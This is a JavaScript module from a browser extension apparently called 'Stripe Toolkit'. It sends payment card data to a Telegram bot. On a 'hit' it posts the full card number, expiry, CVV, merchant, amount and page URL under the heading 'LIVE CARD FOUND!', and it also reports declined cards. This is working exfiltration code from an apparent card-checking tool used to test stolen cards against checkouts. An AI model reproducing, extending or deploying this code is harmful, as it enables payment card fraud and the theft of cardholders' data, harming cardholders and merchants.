// Telegram Notification Module
(function() {
    'use strict';
    
    async function sendTelegramMessage(botToken, chatId, message) {
        try {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const data = await response.json();
            return data.ok;
        } catch (error) {
            console.error('[TELEGRAM] Error sending message:', error);
            return false;
        }
    }
    
    async function sendHitNotification(cardInfo, checkoutInfo) {
        chrome.storage.local.get(['telegramBotToken', 'telegramChatId', 'telegramHitsEnabled'], async (data) => {
            if (!data.telegramBotToken || !data.telegramChatId) {
                console.log('[TELEGRAM] Bot token or chat ID not configured');
                return;
            }
            
            if (!data.telegramHitsEnabled) {
                console.log('[TELEGRAM] Hit notifications disabled');
                return;
            }
            
            const message = `
🎉 <b>LIVE CARD FOUND!</b> 🎉

💳 <b>Card:</b> <code>${cardInfo.number}</code>
📅 <b>Expiry:</b> ${cardInfo.expMonth}/${cardInfo.expYear}
🔐 <b>CVV:</b> ${cardInfo.cvv}

🏪 <b>Merchant:</b> ${checkoutInfo.merchantName || 'Unknown'}
💰 <b>Amount:</b> ${checkoutInfo.amount || 'N/A'} ${checkoutInfo.currency || ''}
🌐 <b>URL:</b> ${checkoutInfo.url || window.location.href}
⏰ <b>Time:</b> ${new Date().toLocaleString()}

✅ <b>Status:</b> APPROVED
            `.trim();
            
            const success = await sendTelegramMessage(
                data.telegramBotToken,
                data.telegramChatId,
                message
            );
            
            if (success) {
                console.log('[TELEGRAM] Hit notification sent successfully');
            } else {
                console.error('[TELEGRAM] Failed to send hit notification');
            }
        });
    }
    
    async function sendDeclineNotification(cardInfo, declineReason) {
        chrome.storage.local.get(['telegramBotToken', 'telegramChatId', 'telegramDeclinesEnabled'], async (data) => {
            if (!data.telegramBotToken || !data.telegramChatId) {
                return;
            }
            
            if (!data.telegramDeclinesEnabled) {
                return;
            }
            
            const message = `
❌ <b>CARD DECLINED</b>

💳 <b>Card:</b> <code>${cardInfo.number}</code>
📅 <b>Expiry:</b> ${cardInfo.expMonth}/${cardInfo.expYear}

⚠️ <b>Reason:</b> ${declineReason || 'Unknown'}
🌐 <b>URL:</b> ${window.location.href}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
            `.trim();
            
            await sendTelegramMessage(
                data.telegramBotToken,
                data.telegramChatId,
                message
            );
        });
    }
    
    async function testTelegramConnection(botToken, chatId) {
        const message = `
🔔 <b>Stripe Toolkit - Test Message</b>

✅ Connection successful!
⏰ ${new Date().toLocaleString()}

Your Telegram notifications are working correctly.
        `.trim();
        
        return await sendTelegramMessage(botToken, chatId, message);
    }
    
    // Export functions
    if (typeof window !== 'undefined') {
        window.TelegramNotifier = {
            sendHitNotification,
            sendDeclineNotification,
            testTelegramConnection
        };
    }
    
    // For background script
    if (typeof chrome !== 'undefined' && chrome.runtime) {
        self.TelegramNotifier = {
            sendHitNotification,
            sendDeclineNotification,
            testTelegramConnection
        };
    }
})();
